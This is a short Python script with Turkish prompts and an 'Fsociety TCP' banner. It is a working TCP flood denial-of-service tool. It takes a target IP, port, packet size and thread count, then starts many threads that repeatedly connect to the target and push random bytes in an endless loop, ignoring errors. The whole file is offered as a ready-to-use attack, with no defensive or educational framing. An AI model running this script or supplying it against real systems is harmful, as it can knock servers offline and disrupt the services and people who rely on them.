import socket
import random
import threading
import pyfiglet

ascii_art = pyfiglet.figlet_format("Fsociety TCP")
print(ascii_art)

target_ip = input("Hedef IP: ")
target_port = int(input("Hedef Port: "))
packet_size = int(input("Paket boyutu (byte): "))
thread_count = int(input("Thread sayısı: "))

def tcp_flood():
    bytes = random._urandom(packet_size)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            sock.sendall(bytes)
            sock.close()
        except:
            pass

print(f"Başlatılıyor: {target_ip}:{target_port} - Thread sayısı: {thread_count}")

for _ in range(thread_count):
    t = threading.Thread(target=tcp_flood)
    t.daemon = True
    t.start()

try:
    while True:
        pass
except KeyboardInterrupt:
    print("\nDurduruldu!")
